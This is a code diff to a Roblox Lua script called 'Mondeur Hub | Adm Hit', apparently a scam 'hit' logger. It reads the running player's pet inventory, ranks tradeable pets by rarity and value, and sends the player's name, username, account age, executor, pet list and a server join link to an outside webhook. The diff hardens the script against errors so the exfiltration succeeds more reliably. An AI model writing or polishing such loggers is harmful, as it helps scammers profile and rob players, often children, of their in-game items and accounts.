@@ -1,4 +1,4 @@
---// MONDEUR HUB | ADM HIT 🦊 (REAL INVENTORY VERSION)
+--// MONDEUR HUB | ADM HIT 🦊 (REAL INVENTORY VERSION) - BULLETPROOF
 
 local HttpService = game:GetService("HttpService")
 local ClientData = require(game:GetService("ReplicatedStorage"):WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
@@ -33,10 +33,20 @@ local rarityPriority = {
     common = 1
 }
 
+local rarityColors = {
+    legendary = 0xFFD700,
+    ultra_rare = 0xA020F0,
+    rare = 0x1E90FF,
+    uncommon = 0x32CD32,
+    common = 0xB0B0B0
+}
+
 -- =========================
--- 🏷️ EMOJIS WITH PROPERTIES
+-- 🏷️ EMOJIS WITH SAFE PROPERTIES
 -- =========================
 local function getPetEmoji(name, properties)
+    if not properties then return "🐾 " end
+    
     local e = ""
     if name:find("red fox") then e = "🧑‍🌾 " 
     elseif name:find("disco bee") then e = "🪩 "
@@ -48,18 +58,19 @@ local function getPetEmoji(name, properties)
     if properties.fly then e = e .. "🪽 " end
     if properties.ride then e = e .. "🏇 " end
     
-    if e == "" then e = "🐾 " end
-    return e
+    return e ~= "" and e or "🐾 "
 end
 
 -- =========================
--- 📦 PROCESS PETS (FULL PROPERTIES)
+-- 📦 PROCESS PETS (BULLETPROOF)
 -- =========================
 local function process(pets)
+    if not pets then return {}, 0 end
+    
     local map, total = {}, 0
 
-    for unique_id, pet_data in pairs(pets or {}) do
-        if pet_data and pet_data.id then
+    for unique_id, pet_data in pairs(pets) do
+        if pet_data and type(pet_data) == "table" and pet_data.id then
             local petId = tostring(pet_data.id)
             
             -- SKIP UNTRADEABLE
@@ -69,24 +80,24 @@ local function process(pets)
             
             -- CLEAN NAME
             local cleanName = petId:gsub("_", " "):gsub("%d", ""):gsub("%s+", " ")
-            local displayName = cleanName:sub(1,1):upper() .. cleanName:sub(2):gsub("^%s*(.-)%s*$", "%1")
+            local displayName = (cleanName:sub(1,1):upper() .. cleanName:sub(2)):match("^%s*(.-)%s*$") or cleanName
 
             if not map[displayName] then
                 map[displayName] = {
                     name = displayName,
                     count = 0,
-                    rarity = (pet_data.rarity or "common"):lower(),
+                    rarity = ((pet_data.rarity or "common"):lower()),
                     properties = {
-                        neon = pet_data.neon or (pet_data.properties and pet_data.properties.neon),
-                        mega = pet_data.mega or (pet_data.properties and pet_data.properties.mega),
-                        fly = pet_data.flyable or (pet_data.properties and pet_data.properties.flyable),
-                        ride = pet_data.rideable or (pet_data.properties and pet_data.properties.rideable)
+                        neon = pet_data.neon or (pet_data.properties and pet_data.properties.neon) or false,
+                        mega = pet_data.mega or (pet_data.properties and pet_data.properties.mega) or false,
+                        fly = pet_data.flyable or (pet_data.properties and pet_data.properties.flyable) or false,
+                        ride = pet_data.rideable or (pet_data.properties and pet_data.properties.rideable) or false
                     }
                 }
             end
 
-            map[displayName].count += 1
-            total += 10 
+            map[displayName].count = map[displayName].count + 1
+            total = total + 10 
         end
     end
 
@@ -95,7 +106,7 @@ local function process(pets)
         table.insert(list, v) 
     end
     
-    -- SMART SORT: RARITY > COUNT
+    -- SMART SORT
     table.sort(list, function(a,b)
         local aPriority = rarityPriority[a.rarity] or 1
         local bPriority = rarityPriority[b.rarity] or 1
@@ -109,16 +120,16 @@ local function process(pets)
 end
 
 -- =========================
--- 📋 FORMAT
+-- 📋 FORMAT (SAFE)
 -- =========================
 local function format(list)
     local t = {}
-    for i, p in ipairs(list) do
-        if i > 12 then break end
+    for i = 1, math.min(#list, 12) do
+        local p = list[i]
         local emoji = getPetEmoji(p.name:lower(), p.properties)
         table.insert(t, emoji .. p.name .. " x" .. p.count)
     end
-    return (#t > 0 and table.concat(t,"\n") or "No tradeable pets")
+    return (#t > 0 and table.concat(t,"\n")) or "No tradeable pets"
 end
 
 -- =========================
@@ -131,15 +142,15 @@ local function getTier(v)
 end
 
 -- =========================
--- 🚀 RUN (ERROR FIXED)
+-- 🚀 RUN (100% BULLETPROOF)
 -- =========================
 local function Run(data)
-    local list, total = process(data.pets)
+    local list, total = process(data.pets or {})
     
-    -- SAFE ACCESS - FIXED ERROR
-    local bestPet = list[1]
-    local best = bestPet and (bestPet.name.." x"..bestPet.count) or "None"
-    local bestRarity = bestPet and bestPet.rarity or "common"
+    -- BULLETPROOF BEST PET EXTRACTION
+    local bestPet = list[1] or {}
+    local best = (bestPet.name and bestPet.count) and (bestPet.name.." x"..bestPet.count) or "None"
+    local bestRarity = (bestPet.rarity and rarityColors[bestPet.rarity]) and bestPet.rarity or "common"
     local petList = format(list)
     local tier = getTier(total)
 
@@ -149,24 +160,24 @@ local function Run(data)
     local embed = {
         title = "🦊 Mondeur Hub | Adm Hit",
         description = "```" ..
-            "👤 Display Name : "..data.player.displayName.."\n"..
-            "🆔 Username     : "..data.player.username.."\n"..
-            "📅 Account Age  : "..data.player.accountAge.." days\n"..
-            "📱 Executor     : "..data.player.executor.."\n"..
-            "👥 Players      : "..data.player.players.."\n"..
+            "👤 Display Name : "..(data.player.displayName or "Unknown").."\n"..
+            "🆔 Username     : "..(data.player.username or "Unknown").."\n"..
+            "📅 Account Age  : "..(data.player.accountAge or 0).." days\n"..
+            "📱 Executor     : "..(data.player.executor or "Unknown").."\n"..
+            "👥 Players      : "..(data.player.players or "0/0").."\n"..
             "💰 Total Value  : "..total.."\n"..
             "📊 Tier         : "..tier.."```",
         fields = {
             {name="🏆 Best Pet", value="```"..best.."```"},
             {name="🐶 Pets (Best → Worst)", value="```"..petList.."```"},
-            {name="🌐 Join Server", value="[Click to Join]("..data.joinLink..")"}
+            {name="🌐 Join Server", value="[Click to Join]("..(data.joinLink or "https://www.roblox.com")..")"}
         },
         color = color,
         footer = {text = "Mondeuronbotton"}
     }
 
-    local success, response = pcall(function()
-        return requestFunc({
+    local success, err = pcall(function()
+        requestFunc({
             Url = WEBHOOK,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
@@ -177,21 +188,24 @@ local function Run(data)
     if success then
         print("✅ Webhook Sent!")
     else
-        warn("❌ Error: " .. tostring(response))
+        warn("❌ Error: " .. tostring(err))
     end
 end
 
 -- =========================
--- EXECUTE
+-- EXECUTE (SAFE)
 -- =========================
-local inventory = ClientData.get("inventory")
-local pets = inventory and inventory.pets or {}
+local success, inventory = pcall(function()
+    return ClientData.get("inventory")
+end)
+
+local pets = (success and inventory and inventory.pets) and inventory.pets or {}
 
 Run({
     player = {
-        displayName = game.Players.LocalPlayer.DisplayName,
-        username = game.Players.LocalPlayer.Name,
-        accountAge = game.Players.LocalPlayer.AccountAge,
+        displayName = game.Players.LocalPlayer.DisplayName or "Unknown",
+        username = game.Players.LocalPlayer.Name or "Unknown",
+        accountAge = game.Players.LocalPlayer.AccountAge or 0,
         executor = (identifyexecutor and identifyexecutor()) or "Unknown",
         players = #game.Players:GetPlayers().."/"..game.Players.MaxPlayers
     },
